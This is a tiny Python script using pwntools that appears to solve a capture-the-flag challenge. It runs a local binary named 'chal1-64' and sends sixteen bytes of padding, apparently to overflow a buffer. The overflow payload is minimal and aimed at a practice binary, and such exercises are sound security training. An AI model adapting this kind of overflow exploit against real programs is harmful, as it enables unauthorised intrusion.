from pwn import *

path = './chal1-64'

p = process(path)

print(p.recv().decode())
p.send(b'a'*8 + b'x'*8)
print(p.recv().decode())
